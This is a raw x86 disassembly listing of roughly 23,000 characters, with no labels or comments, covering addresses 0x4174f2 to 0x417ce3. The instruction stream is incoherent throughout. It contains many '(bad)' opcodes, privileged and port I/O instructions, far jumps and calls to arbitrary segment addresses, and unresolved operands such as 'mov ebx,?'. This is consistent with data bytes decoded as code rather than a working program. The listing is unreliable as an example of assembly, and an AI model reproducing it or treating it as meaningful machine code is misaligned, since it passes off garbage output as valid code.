  4174f2:	jmp    FWORD PTR ds:0x6d9190d2
  4174f8:	xchg   edi,eax
  4174f9:	mov    eax,ds:0xfb361d2b
  4174fe:	xchg   esp,eax
  4174ff:	cdq    
  417500:	adc    bl,BYTE PTR [edi]
  417502:	stos   BYTE PTR es:[edi],al
  417503:	mov    esi,0x1352eac0
  417508:	mov    eax,edx
  41750a:	mov    WORD PTR [edx],ds
  41750c:	dec    esi
  41750d:	xchg   BYTE PTR [ebp-0x2244f855],ch
  417513:	scas   al,BYTE PTR es:[edi]
  417514:	mov    ebp,0x2ab71148
  417519:	data16 daa 
  41751b:	add    al,0xfa
  41751d:	call   0xaeaf:0x819e3d0e
  417524:	mov    ds:0x76f427e4,al
  417529:	dec    esp
  41752a:	leave  
  41752b:	fcmovnb st,st(5)
  41752d:	mov    ah,0x84
  41752f:	loop   0x4174f6
  417531:	clc    
  417532:	sub    ch,BYTE PTR [edi+0x3c1dca88]
  417538:	inc    edx
  417539:	aam    0x9e
  41753b:	xor    edx,DWORD PTR [eax-0x6d]
  41753e:	fnstcw WORD PTR [edi-0x1b]
  417541:	in     al,0x50
  417543:	test   al,0xdb
  417545:	add    DWORD PTR ds:0x7c991b44,eax
  41754b:	ret    0x8894
  41754e:	dec    edi
  41754f:	sub    ebp,esi
  417551:	pop    es
  417552:	cmc    
  417553:	sub    BYTE PTR [edx+0x2d],bl
  417556:	jecxz  0x417506
  417558:	xchg   ebp,eax
  417559:	je     0x4175a2
  41755b:	mov    ebx,?
  41755d:	ret    0x1186
  417560:	mov    bl,0xf9
  417562:	cmp    BYTE PTR [edi-0x5a894950],ah
  417568:	inc    edi
  417569:	fs jns 0x4175c2
  41756c:	fstp   QWORD PTR [esi-0x6877129c]
  417572:	mov    eax,ds:0xcc67ea97
  417577:	jnp    0x41751c
  417579:	fcmovu st,st(5)
  41757b:	mov    bh,0x11
  41757d:	shl    BYTE PTR [edi+0x40],0x21
  417581:	lods   al,BYTE PTR ds:[esi]
  417582:	pop    ebx
  417583:	data16 sar al,1
  417586:	sbb    ebx,DWORD PTR [ebp-0x3cc8eb41]
  41758c:	cli    
  41758d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41758e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41758f:	lock aas 
  417591:	or     ebx,ecx
  417593:	sbb    al,0x6e
  417595:	rcl    BYTE PTR [edx+0x8],1
  417598:	aaa    
  417599:	xchg   edi,eax
  41759a:	add    bh,BYTE PTR [edi-0x65]
  41759d:	popa   
  41759e:	adc    DWORD PTR [esi+0x5ee5f2a3],0x4f
  4175a5:	xchg   BYTE PTR ds:0x1eb5e228,dl
  4175ab:	pop    edx
  4175ac:	cmp    bl,BYTE PTR [eax+0x37]
  4175af:	call   0x161b:0x3ddc1ba9
  4175b6:	push   ss
  4175b7:	pop    esi
  4175b8:	push   ecx
  4175b9:	xor    ecx,DWORD PTR [ebx+0x5a93ec83]
  4175bf:	fidiv  DWORD PTR [eax-0x7cc4ec2e]
  4175c5:	aaa    
  4175c6:	fisubr DWORD PTR [esi+0x122b6333]
  4175cc:	push   esp
  4175cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175ce:	(bad)
  4175d2:	or     eax,0x746bb6e
  4175d7:	pop    ds
  4175d8:	cmp    dh,bl
  4175da:	push   cs
  4175db:	pop    edi
  4175dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175dd:	push   0x1bcb057
  4175e2:	add    bh,BYTE PTR [esi-0x72796f1e]
  4175e8:	xchg   edi,eax
  4175e9:	mov    ebp,0x72988a9a
  4175ee:	int    0xa2
  4175f0:	lods   al,BYTE PTR ds:[esi]
  4175f1:	mov    ah,0x19
  4175f3:	stc    
  4175f4:	rol    DWORD PTR [ebx],cl
  4175f6:	out    dx,eax
  4175f7:	sahf   
  4175f8:	jnp    0x417641
  4175fa:	pop    ebp
  4175fb:	popa   
  4175fc:	sub    ah,BYTE PTR [esi+0x2d5d40c2]
  417602:	jmp    0x417617
  417604:	mov    BYTE PTR [ebx],dh
  417606:	stc    
  417607:	adc    eax,0xb5b3a0a6
  41760c:	cmp    esi,ecx
  41760e:	hlt    
  41760f:	mov    ds:0xa5e376,al
  417614:	push   0x44
  417616:	push   edi
  417617:	or     eax,0x4b66ab2d
  41761c:	and    eax,0x645e1d15
  417621:	bnd je 0x4175a7
  417624:	and    ah,bh
  417626:	dec    edi
  417627:	shl    BYTE PTR [ebx],1
  417629:	lods   eax,DWORD PTR ds:[esi]
  41762a:	push   ecx
  41762b:	mov    dh,0xdf
  41762d:	inc    ecx
  41762e:	jae    0x4175e2
  417630:	inc    ebp
  417631:	pop    DWORD PTR [edx+0x55cd6f8e]
  417637:	test   al,0xe7
  417639:	hlt    
  41763a:	les    ebp,FWORD PTR [edi-0x70]
  41763d:	ss push ecx
  41763f:	fwait
  417640:	mov    al,ds:0xad0cc56
  417645:	mov    edx,DWORD PTR [edi*1+0x52838340]
  41764c:	lahf   
  41764d:	dec    edi
  41764e:	xchg   edx,eax
  41764f:	sbb    dl,dl
  417651:	mov    edx,edi
  417653:	pop    ecx
  417654:	mov    eax,ds:0xdb406274
  417659:	xlat   BYTE PTR ds:[ebx]
  41765a:	cmc    
  41765b:	or     eax,0xc85b552d
  417660:	add    BYTE PTR [edx+0x69],0x69
  417664:	adc    eax,0x65f4e5a
  417669:	xchg   BYTE PTR [esi],bl
  41766b:	xor    BYTE PTR [ebx],cl
  41766d:	add    al,bl
  41766f:	pop    edx
  417670:	jg     0x4176a8
  417672:	lods   al,BYTE PTR ds:[esi]
  417673:	stos   DWORD PTR es:[edi],eax
  417674:	outs   dx,DWORD PTR ds:[esi]
  417675:	imul   ebp,DWORD PTR [edi-0x4],0xa946d8b7
  41767c:	int    0x69
  41767e:	leave  
  41767f:	jmp    0x825fa27c
  417684:	jecxz  0x417696
  417686:	leave  
  417687:	imul   esi,edi,0xaef819fa
  41768d:	fild   QWORD PTR [ebp-0x72]
  417690:	test   BYTE PTR [ebx+0x5ab82c72],bl
  417696:	dec    esi
  417697:	(bad)  
  417698:	cmc    
  417699:	or     al,0x9c
  41769b:	pop    eax
  41769c:	and    eax,0x3cd0aea6
  4176a1:	xor    DWORD PTR es:[edi+0x3b58c4bf],esi
  4176a8:	enter  0x3183,0xe3
  4176ac:	scas   al,BYTE PTR es:[edi]
  4176ad:	inc    eax
  4176ae:	xor    BYTE PTR [eax-0x75],cl
  4176b1:	xor    eax,0xaa656557
  4176b6:	jmp    0xdfbf:0x38a8bc45
  4176bd:	cwde   
  4176be:	call   0xbd2c6c6f
  4176c3:	pop    ebp
  4176c4:	jnp    0x417657
  4176c6:	cmp    BYTE PTR [edx-0x448e3fee],bh
  4176cc:	fadd   DWORD PTR [edi]
  4176ce:	out    dx,al
  4176cf:	stos   BYTE PTR es:[edi],al
  4176d0:	jne    0x41771a
  4176d2:	and    dh,BYTE PTR [ebp+0x5eaaca6]
  4176d8:	adc    eax,DWORD PTR [edx]
  4176da:	addr16 or al,0xa4
  4176dd:	shl    BYTE PTR [ebx],cl
  4176df:	scas   al,BYTE PTR es:[edi]
  4176e0:	or     esi,ebx
  4176e2:	stc    
  4176e3:	test   BYTE PTR [ebp+0x6175db2d],dh
  4176e9:	mov    eax,ds:0x79f6ef7
  4176ee:	cmc    
  4176ef:	or     edi,ebx
  4176f1:	fld    QWORD PTR [ecx+0x66f7926d]
  4176f7:	cwde   
  4176f8:	sti    
  4176f9:	dec    edx
  4176fa:	addr16 cmp al,0x6e
  4176fd:	mov    bl,0xad
  4176ff:	xchg   ecx,eax
  417700:	and    BYTE PTR [eax],dh
  417702:	cmp    al,0x32
  417704:	add    bh,BYTE PTR ds:0x7db63df7
  41770a:	xor    ch,BYTE PTR ds:0x89db603d
  417710:	jp     0x417755
  417712:	fst    DWORD PTR [edi+0x7ddb1b2d]
  417718:	sbb    dh,BYTE PTR [edi]
  41771a:	retf   
  41771b:	mov    esi,0x678c05ec
  417720:	inc    ecx
  417721:	jae    0x417791
  417723:	cmc    
  417724:	jo     0x41772a
  417726:	out    0x7,eax
  417728:	and    BYTE PTR [ebp+0x3bfeef60],dl
  41772e:	xor    eax,0xa9a7fddc
  417733:	push   ss
  417734:	mov    bl,0xdb
  417736:	pop    eax
  417737:	pusha  
  417738:	cmc    
  417739:	dec    esi
  41773a:	xchg   esi,eax
  41773b:	pusha  
  41773c:	and    dl,BYTE PTR [eax+ebx*2-0x32e18b0b]
  417743:	hlt    
  417744:	pop    esp
  417745:	cs mov cs:0x662abd11,al
  41774c:	fadd   DWORD PTR [ecx-0x49]
  41774f:	push   edi
  417750:	repz mov WORD PTR [eax-0x54],ss
  417754:	pop    esp
  417755:	pop    eax
  417756:	ror    DWORD PTR [edi],1
  417758:	sub    eax,0x4ba185c5
  41775d:	cld    
  41775e:	push   ecx
  41775f:	cli    
  417760:	xchg   ecx,eax
  417761:	and    eax,0x325291ff
  417766:	mov    cl,0x7c
  417768:	mov    eax,0x1ff2c18f
  41776d:	ja     0x41778b
  41776f:	dec    eax
  417770:	or     DWORD PTR [ebx],esi
  417772:	adc    ah,BYTE PTR [esi+0x7b9835dc]
  417778:	mov    eax,ds:0xb79dc674
  41777d:	inc    DWORD PTR [ebp+0x72]
  417780:	dec    ebp
  417781:	outs   dx,DWORD PTR ds:[esi]
  417782:	lods   al,BYTE PTR ds:[esi]
  417783:	jnp    0x417717
  417785:	sub    BYTE PTR [ebx+0x337d8556],dh
  41778b:	les    eax,FWORD PTR [edx-0x3f9e3cf7]
  417791:	sbb    eax,0xd7e73d1d
  417796:	ds pop esi
  417798:	mov    DWORD PTR [ecx-0x7dfc922],esi
  41779e:	jl     0x417761
  4177a0:	sbb    BYTE PTR [esi+0x72e5cc57],bh
  4177a6:	add    dh,BYTE PTR ds:0xd124fafc
  4177ac:	xchg   ecx,eax
  4177ad:	lods   al,BYTE PTR ds:[esi]
  4177ae:	mov    edi,0x15a63d82
  4177b3:	sbb    al,0x4c
  4177b5:	mov    dl,0x73
  4177b7:	push   cs
  4177b8:	stos   BYTE PTR es:[edi],al
  4177b9:	fcomp  DWORD PTR [ebx+0x3b]
  4177bc:	mov    edx,DWORD PTR [eax+ebp*4+0x12]
  4177c0:	rcl    ecx,0xf5
  4177c3:	add    BYTE PTR [edi-0x2077c40e],0x19
  4177ca:	ins    DWORD PTR es:[edi],dx
  4177cb:	cmp    al,0xb2
  4177cd:	pop    ecx
  4177ce:	ret    0x8e5f
  4177d1:	pop    ebp
  4177d2:	rol    BYTE PTR [esi+0x6ba77de0],1
  4177d8:	mov    al,ds:0x8f833993
  4177dd:	ja     0x4177cb
  4177df:	js     0x41785f
  4177e1:	mov    bh,0xe1
  4177e3:	les    edx,FWORD PTR [edi+0x1e]
  4177e6:	xor    al,0xe0
  4177e8:	in     al,0x3e
  4177ea:	push   0x3a6d46c5
  4177ef:	leave  
  4177f0:	sub    BYTE PTR [edi+0x29],dh
  4177f3:	push   edx
  4177f4:	jl     0x41784c
  4177f6:	dec    eax
  4177f7:	xor    al,0xd4
  4177f9:	aaa    
  4177fa:	test   BYTE PTR [edx+ecx*8+0x29],0x22
  4177ff:	jb     0x417790
  417801:	dec    ebx
  417802:	jle    0x417859
  417804:	call   0x13849f3c
  417809:	sbb    al,0xfe
  41780b:	add    al,0x95
  41780d:	push   0xffffff9c
  41780f:	out    0x3c,al
  417811:	ss call 0xdb85:0x7d25134a
  417819:	loopne 0x4177a0
  41781b:	out    0xd2,al
  41781d:	mov    ecx,0x93be47cc
  417822:	loopne 0x417887
  417824:	aad    0xd1
  417826:	popa   
  417827:	sbb    eax,0x47b59718
  41782c:	push   ebx
  41782d:	and    BYTE PTR [edx-0x6b840c69],bh
  417833:	xchg   ebp,eax
  417834:	mov    ebx,0xcede0ae7
  417839:	test   al,0xfe
  41783b:	jl     0x417818
  41783d:	xlat   BYTE PTR ds:[ebx]
  41783e:	push   edi
  41783f:	sbb    esp,DWORD PTR [ebx]
  417841:	and    eax,0x809f4001
  417846:	sti    
  417847:	xor    bl,BYTE PTR [edx]
  417849:	mov    ah,0xad
  41784b:	fs xor dl,0x97
  41784f:	or     DWORD PTR [ebx],edi
  417851:	pop    esp
  417852:	fnstcw WORD PTR [edx+esi*2-0x31184ee0]
  417859:	addr16 xchg ebp,eax
  41785b:	adc    al,0x5c
  41785d:	je     0x4178b9
  41785f:	out    0x9,al
  417861:	out    dx,eax
  417862:	adc    cl,dl
  417864:	or     BYTE PTR [eax-0x9],al
  417867:	sbb    DWORD PTR [ecx],eax
  417869:	fimul  DWORD PTR ds:[edx+0x50bc29b0]
  417870:	push   esp
  417871:	jge    0x41785a
  417873:	ins    BYTE PTR es:[edi],dx
  417874:	sahf   
  417875:	pop    ecx
  417876:	hlt    
  417877:	push   edx
  417878:	(bad)  
  417879:	data16 in al,0x5b
  41787c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41787d:	cld    
  41787e:	pop    esi
  41787f:	int3   
  417880:	or     al,0xd4
  417882:	test   BYTE PTR [edx-0x1b],cl
  417885:	or     eax,0xaa219fa4
  41788a:	add    DWORD PTR [ecx],edi
  41788c:	push   es
  41788d:	cmp    ebx,DWORD PTR [esi]
  41788f:	sub    eax,0x72209df0
  417894:	mov    ch,0x95
  417896:	sbb    esi,DWORD PTR [ecx]
  417898:	call   0xa563:0x571f4644
  41789f:	outs   dx,BYTE PTR ds:[esi]
  4178a0:	mov    DWORD PTR [esi-0x25],ebx
  4178a3:	fiadd  WORD PTR [esi]
  4178a5:	jmp    0x4c62:0xa7df7a79
  4178ac:	inc    ebp
  4178ad:	stos   DWORD PTR es:[edi],eax
  4178ae:	push   es
  4178af:	jg     0x4178f1
  4178b1:	js     0x417884
  4178b3:	sub    esp,DWORD PTR ds:0x716448ff
  4178b9:	mov    esp,0xb8f8930d
  4178be:	cdq    
  4178bf:	adc    eax,0x90985a34
  4178c4:	mov    ah,0xa8
  4178c6:	and    eax,0xae2d9ec5
  4178cb:	leave  
  4178cc:	push   ecx
  4178cd:	jo     0x4178c8
  4178cf:	stc    
  4178d0:	mov    dl,0xc6
  4178d2:	retf   
  4178d3:	xor    edx,DWORD PTR [bx+di-0x1505]
  4178d8:	into   
  4178d9:	cmc    
  4178da:	imul   edx,edx,0x522c1638
  4178e0:	inc    ebx
  4178e1:	loope  0x4178ce
  4178e3:	jb     0x417947
  4178e5:	repnz les edx,FWORD PTR [ecx+0x7b]
  4178e9:	ss xchg edi,eax
  4178eb:	mov    edi,0x531be16d
  4178f0:	scas   al,BYTE PTR es:[edi]
  4178f1:	inc    BYTE PTR ds:0x31be7908
  4178f7:	mov    eax,ds:0x119efe94
  4178fc:	push   ecx
  4178fd:	imul   esi,ecx,0x40
  417900:	sub    BYTE PTR [eax+0x1dea9cdb],bh
  417906:	sub    eax,0xa8d2b7b9
  41790b:	rol    dl,cl
  41790d:	int    0x3e
  41790f:	mov    BYTE PTR [esi-0x989d540],al
  417915:	jnp    0x41791f
  417917:	sub    ah,dl
  417919:	pop    ebx
  41791a:	in     al,dx
  41791b:	sbb    al,0xbb
  41791d:	xchg   DWORD PTR [edx],esp
  41791f:	aas    
  417920:	cld    
  417921:	add    eax,0x90dd1496
  417926:	xchg   edi,eax
  417927:	sub    DWORD PTR [eax-0x3eb645fe],edi
  41792d:	test   eax,0x1247c4d6
  417932:	loopne 0x4178e8
  417934:	lods   al,BYTE PTR ds:[esi]
  417935:	(bad)  
  417936:	in     al,0x65
  417938:	sbb    DWORD PTR [ebp-0xbab4467],ebx
  41793e:	mov    esi,0xb43f3d8a
  417943:	push   ebx
  417944:	ret    0xdb47
  417947:	loop   0x417999
  417949:	in     eax,dx
  41794a:	adc    BYTE PTR [edx+0x1d],bl
  41794d:	xor    edi,ebp
  41794f:	jo     0x4179a5
  417951:	clc    
  417952:	outs   dx,BYTE PTR ds:[esi]
  417953:	sahf   
  417954:	das    
  417955:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417956:	test   BYTE PTR [eax],ch
  417958:	dec    esi
  417959:	loop   0x417941
  41795b:	and    cl,ch
  41795d:	int3   
  41795e:	xchg   ecx,eax
  41795f:	scas   al,BYTE PTR es:[edi]
  417960:	mov    edi,0xdc4b4fb
  417965:	add    DWORD PTR [ecx-0x3d],ebp
  417968:	push   ebp
  417969:	pusha  
  41796a:	push   ebx
  41796b:	inc    ebp
  41796c:	popa   
  41796d:	xchg   edi,eax
  41796e:	jns    0x4179e7
  417970:	mov    ebx,0xb1fb44bc
  417975:	xchg   edi,eax
  417976:	mov    ch,0xb2
  417978:	cmp    BYTE PTR ds:0x1fd2,bh
  41797d:	sub    BYTE PTR [ebx],dl
  41797f:	mul    BYTE PTR [esi+0xc]
  417982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417983:	out    0xa0,al
  417985:	cwde   
  417986:	in     eax,dx
  417987:	hlt    
  417988:	mov    al,ds:0x3f4d4c89
  41798d:	(bad)  
  41798e:	jb     0x4179e7
  417990:	jmp    0x4179e7
  417992:	outs   dx,DWORD PTR ds:[esi]
  417993:	cs (bad) 
  417995:	mov    al,ds:0x13f68651
  41799a:	nop
  41799b:	cdq    
  41799c:	mov    esp,edi
  41799e:	mov    eax,ds:0xec2059d4
  4179a3:	retf   0xb413
  4179a6:	add    ebp,edx
  4179a8:	inc    esi
  4179a9:	int    0xba
  4179ab:	and    BYTE PTR [ebx-0x6aae934a],0x6b
  4179b2:	pushf  
  4179b3:	out    0x27,al
  4179b5:	ret    
  4179b6:	sar    BYTE PTR [ecx],cl
  4179b8:	mov    ds:0xf38f6625,eax
  4179bd:	ja     0x417956
  4179bf:	sbb    bl,0x28
  4179c2:	inc    eax
  4179c3:	xchg   edi,eax
  4179c4:	in     eax,dx
  4179c5:	fdiv   DWORD PTR [edi-0x77]
  4179c8:	or     DWORD PTR [eax],ebx
  4179ca:	or     bh,ah
  4179cc:	(bad)
  4179d1:	sbb    edi,DWORD PTR [edi]
  4179d3:	pop    eax
  4179d4:	jmp    0x5f9d:0xc0f6d8dc
  4179db:	jle    0x417963
  4179dd:	xor    ah,ch
  4179df:	leave  
  4179e0:	adc    dh,BYTE PTR [edx]
  4179e2:	mov    WORD PTR [eax],?
  4179e4:	sbb    ecx,0x3b2aa2d
  4179ea:	(bad)  
  4179eb:	adc    eax,0x975bd889
  4179f0:	mov    BYTE PTR [esi],dh
  4179f2:	pusha  
  4179f3:	inc    esp
  4179f4:	inc    eax
  4179f5:	pop    esp
  4179f6:	add    dh,bl
  4179f8:	push   cs
  4179f9:	test   al,0xc4
  4179fb:	fidiv  WORD PTR [esi-0x13ea60c8]
  417a01:	imul   BYTE PTR [eax+0x24]
  417a04:	pop    ebx
  417a05:	jb     0x4179f9
  417a07:	sub    al,0xac
  417a09:	dec    ecx
  417a0a:	cmp    DWORD PTR [eax-0xf77db85],ecx
  417a10:	push   ebp
  417a11:	push   ds
  417a12:	mov    DWORD PTR [ebx+ebx*2-0x3152156c],ecx
  417a19:	loope  0x417a3a
  417a1b:	mov    al,ds:0x9e600fd5
  417a20:	mov    edi,0x9d50e40f
  417a25:	xchg   BYTE PTR [edx-0x1767e408],bh
  417a2b:	mov    dh,0x1d
  417a2d:	mov    eax,ds:0x2c71040a
  417a32:	mov    ds:0x5ac2ca9b,eax
  417a37:	iret   
  417a38:	inc    ecx
  417a39:	xor    ah,al
  417a3b:	test   al,0x91
  417a3d:	pop    edi
  417a3e:	xchg   dx,ax
  417a40:	push   ebp
  417a41:	jbe    0x417a36
  417a43:	imul   edi,DWORD PTR [eax],0x601dd077
  417a49:	loopne 0x4179f3
  417a4b:	pop    esi
  417a4c:	sub    DWORD PTR [ebx-0x7a],edi
  417a4f:	xchg   ebp,eax
  417a50:	std    
  417a51:	test   al,0xc8
  417a53:	sahf   
  417a54:	adc    al,0x38
  417a56:	outs   dx,BYTE PTR ds:[esi]
  417a57:	loop   0x4179ef
  417a59:	jmp    0x417a0d
  417a5b:	repz das 
  417a5d:	sub    DWORD PTR [ebx+0xc],ebx
  417a60:	(bad)  
  417a61:	stos   BYTE PTR es:[edi],al
  417a62:	and    al,0xbb
  417a64:	mov    esi,0x81a84c0e
  417a69:	jnp    0x417a36
  417a6b:	push   ebx
  417a6c:	fdiv   DWORD PTR [ebx-0x9094528]
  417a72:	into   
  417a73:	xor    DWORD PTR [esi+0x3d8d117c],0xf4607907
  417a7d:	or     DWORD PTR [ecx+eiz*1],esi
  417a80:	inc    ecx
  417a81:	sar    BYTE PTR [ebx+0x26],1
  417a84:	rcr    DWORD PTR [esi],0xce
  417a87:	loop   0x417a42
  417a89:	xor    esp,DWORD PTR [edi]
  417a8b:	cdq    
  417a8c:	add    al,0x8
  417a8e:	repnz leave 
  417a90:	jbe    0x417a8a
  417a92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a93:	cmp    DWORD PTR [esi-0x52],ebx
  417a96:	mov    ds:0x6087a3c0,al
  417a9b:	int    0x28
  417a9d:	arpl   dx,bp
  417a9f:	lock xchg DWORD PTR [esi+0x56],ebx
  417aa3:	cdq    
  417aa4:	cdq    
  417aa5:	dec    ebp
  417aa6:	add    al,BYTE PTR [eax]
  417aa8:	add    al,BYTE PTR [ecx-0x12]
  417aab:	adc    BYTE PTR [ecx],cl
  417aad:	je     0x417b0b
  417aaf:	(bad)  
  417ab0:	or     eax,0xb62f4246
  417ab5:	and    DWORD PTR [edi+0x43],ebx
  417ab8:	jmp    0xc8a3:0x5a3227f5
  417abf:	aad    0xbb
  417ac1:	mov    esp,0xea0033ca
  417ac6:	fucom  st(7)
  417ac8:	fistp  WORD PTR [eax-0x5a]
  417acb:	adc    ebp,edx
  417acd:	jmp    0x5a08:0xa0c2b2a5
  417ad4:	sahf   
  417ad5:	outs   dx,DWORD PTR ds:[esi]
  417ad6:	pop    ebx
  417ad7:	in     al,dx
  417ad8:	jmp    0xf7a7f23
  417add:	psrlq  mm4,QWORD PTR [ebp-0x11]
  417ae1:	mov    BYTE PTR [ebp-0x4c],bh
  417ae4:	and    edx,eax
  417ae6:	ss xchg ebp,eax
  417ae8:	inc    ecx
  417ae9:	xor    ah,BYTE PTR [ecx-0x1b71d190]
  417aef:	fimul  WORD PTR [eax-0x33df3fad]
  417af5:	ins    DWORD PTR es:[edi],dx
  417af6:	xchg   BYTE PTR [esi],al
  417af8:	inc    eax
  417af9:	icebp  
  417afa:	xor    BYTE PTR [ecx-0x52cc84c8],0xcb
  417b01:	jle    0x417ab8
  417b03:	pop    es
  417b04:	cld    
  417b05:	fisubr DWORD PTR [edx+ecx*2+0x6d]
  417b09:	dec    edi
  417b0a:	jno    0x417b0d
  417b0c:	push   ebx
  417b0d:	iret   
  417b0e:	mov    ch,0xb4
  417b10:	xchg   DWORD PTR [ecx-0x42],ebx
  417b13:	test   eax,0x8ffaa566
  417b18:	and    BYTE PTR [esi+ebx*4+0x7a],dh
  417b1c:	mov    bl,0x4d
  417b1e:	jmp    0x4a32:0xc679c3bd
  417b25:	ret    0xf6de
  417b28:	jle    0x417b35
  417b2a:	sbb    DWORD PTR [edi+0x58d6da26],0xffffffde
  417b31:	test   BYTE PTR [ebx],bh
  417b33:	push   edx
  417b34:	mov    ebx,0x701e7198
  417b39:	mov    eax,0x304e6b51
  417b3e:	sub    BYTE PTR [ebx+edi*2],cl
  417b41:	push   ebp
  417b42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b43:	aad    0x1a
  417b45:	dec    esi
  417b46:	(bad)  
  417b47:	push   esp
  417b48:	fsubr  st(5),st
  417b4a:	push   ebp
  417b4b:	aas    
  417b4c:	sti    
  417b4d:	and    bl,BYTE PTR [ebp-0x7a4ac0df]
  417b53:	pop    esp
  417b54:	jmp    0x417adc
  417b56:	mov    eax,0xcc00865e
  417b5b:	nop
  417b5c:	mov    edi,0xbbf8c8e5
  417b61:	jb     0x417b34
  417b63:	xchg   ebp,eax
  417b64:	add    esi,DWORD PTR [edx]
  417b66:	dec    eax
  417b67:	jns    0x417b3a
  417b69:	pop    ss
  417b6a:	das    
  417b6b:	ss jns 0x417b16
  417b6e:	ins    DWORD PTR es:[edi],dx
  417b6f:	push   0x4e0a7573
  417b74:	in     al,0xd2
  417b76:	mov    dh,0x17
  417b78:	mov    ecx,DWORD PTR [esi]
  417b7a:	xchg   ecx,eax
  417b7b:	and    DWORD PTR [esi],eax
  417b7d:	mov    WORD PTR [esi],es
  417b7f:	mov    dl,0xbe
  417b81:	cmc    
  417b82:	mov    esi,0x55c1c9e
  417b87:	push   edx
  417b88:	jo     0x417b48
  417b8a:	sbb    eax,0xc3de0fca
  417b8f:	mov    BYTE PTR [eax+0x22],al
  417b92:	push   edi
  417b93:	(bad)  
  417b94:	in     eax,0x1c
  417b96:	dec    eax
  417b97:	imul   ebp,DWORD PTR [edx],0x4
  417b9a:	in     eax,dx
  417b9b:	mov    ds:0x6d03568c,eax
  417ba0:	jg     0x417baf
  417ba2:	fs pushf 
  417ba4:	mov    ecx,0x48d29ca0
  417ba9:	sub    al,0x1c
  417bab:	sub    DWORD PTR [edi-0x2baaa19f],edx
  417bb1:	dec    esi
  417bb2:	cld    
  417bb3:	adc    eax,0xd6d631c8
  417bb8:	fld    QWORD PTR [edi-0x44]
  417bbb:	push   0x22
  417bbd:	push   ss
  417bbe:	stc    
  417bbf:	xchg   edx,eax
  417bc0:	mov    al,ds:0xe015eb70
  417bc5:	stos   BYTE PTR es:[edi],al
  417bc6:	in     al,0xd4
  417bc8:	popa   
  417bc9:	and    ebx,DWORD PTR [ecx]
  417bcb:	cmp    al,BYTE PTR [ebx]
  417bcd:	shl    DWORD PTR [ebx-0x1979b87c],1
  417bd3:	sbb    DWORD PTR [eax],0x6
  417bd6:	jno    0x417bd3
  417bd8:	jmp    0x999d:0x292a0ba9
  417bdf:	scas   al,BYTE PTR es:[edi]
  417be0:	les    esi,FWORD PTR [edi+0x7e4c1cb7]
  417be6:	mov    ebp,0xe763cf18
  417beb:	loop   0x417c29
  417bed:	icebp  
  417bee:	sti    
  417bef:	popa   
  417bf0:	xor    ebp,DWORD PTR ds:0x530520b2
  417bf6:	push   esp
  417bf7:	pop    edi
  417bf8:	push   ebp
  417bf9:	adc    al,0x9f
  417bfb:	cmp    BYTE PTR [esi+0x3854df48],cl
  417c01:	retf   0x69d9
  417c04:	call   0x8142:0xa4259488
  417c0b:	cmp    al,0xcd
  417c0d:	clc    
  417c0e:	mov    cl,0x28
  417c10:	fldcw  WORD PTR [ecx-0x1]
  417c13:	push   ss
  417c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c15:	mov    edi,0x5cdc3956
  417c1a:	adc    al,0x91
  417c1c:	and    ecx,esi
  417c1e:	enter  0xb350,0xb0
  417c22:	push   ecx
  417c23:	(bad)  
  417c24:	int    0xf6
  417c26:	es scas eax,DWORD PTR es:[edi]
  417c28:	or     DWORD PTR [edi],edx
  417c2a:	mov    dh,0x26
  417c2c:	shl    DWORD PTR [ebx],1
  417c2e:	scas   eax,DWORD PTR es:[edi]
  417c2f:	clc    
  417c30:	push   ebp
  417c31:	push   ecx
  417c32:	mov    dl,0x31
  417c34:	call   0x261:0xe232afcf
  417c3b:	mov    esi,0x5ee9d66b
  417c40:	leave  
  417c41:	mov    ebp,0xbf25d2d6
  417c46:	call   0x919b:0x6f93de79
  417c4d:	scas   al,BYTE PTR es:[edi]
  417c4e:	sar    BYTE PTR [eax-0x44edf01e],cl
  417c54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c55:	jo     0x417ca3
  417c57:	sbb    ah,bl
  417c59:	arpl   dx,di
  417c5b:	test   al,0x52
  417c5d:	pop    ss
  417c5e:	repz scas al,BYTE PTR es:[edi]
  417c60:	jo     0x417bf5
  417c62:	or     DWORD PTR [edi-0x5d],ecx
  417c65:	ret    
  417c66:	rol    dh,0xbb
  417c69:	lods   al,BYTE PTR ds:[esi]
  417c6a:	cmp    DWORD PTR [eax+0x5e],edx
  417c6d:	xor    DWORD PTR [esi+0x1c],esi
  417c70:	jns    0x417cc5
  417c72:	ins    DWORD PTR es:[edi],dx
  417c73:	cli    
  417c74:	add    BYTE PTR [eax+ecx*1],0xc
  417c78:	dec    edx
  417c79:	mov    ah,0x25
  417c7b:	rcl    esp,0xc9
  417c7e:	arpl   WORD PTR [ebp-0x13f51ef0],si
  417c84:	mov    esi,0x3b808f18
  417c89:	ins    DWORD PTR es:[edi],dx
  417c8a:	lahf   
  417c8b:	mov    al,0x79
  417c8d:	mov    eax,0x90e99344
  417c92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c93:	gs scas al,BYTE PTR es:[edi]
  417c95:	add    eax,0x695ba919
  417c9a:	cmp    eax,0x41e7e149
  417c9f:	cdq    
  417ca0:	add    DWORD PTR [ebx-0x44b867fc],ebp
  417ca6:	dec    eax
  417ca7:	sbb    BYTE PTR [esi-0x6b13fe1d],0x7c
  417cae:	sbb    eax,0x32574c5
  417cb3:	add    BYTE PTR [ebx+0x38c22639],0xdc
  417cba:	xor    DWORD PTR [ebp+0x0],ebx
  417cbd:	mov    al,ds:0xe3a626ab
  417cc2:	mov    ah,0xda
  417cc4:	addr16 push 0xfffffffa
  417cc7:	pop    edx
  417cc8:	jmp    0x29e0c9ef
  417ccd:	xchg   ecx,eax
  417cce:	pop    esp
  417ccf:	fild   QWORD PTR [ebp+0x40ac48eb]
  417cd5:	sbb    cl,BYTE PTR [ecx-0x4f]
  417cd8:	pushf  
  417cd9:	sbb    al,0xf4
  417cdb:	outs   dx,BYTE PTR ds:[esi]
  417cdc:	mov    WORD PTR [ebp*4-0x2529be27],gs
  417ce3:	pop    esi
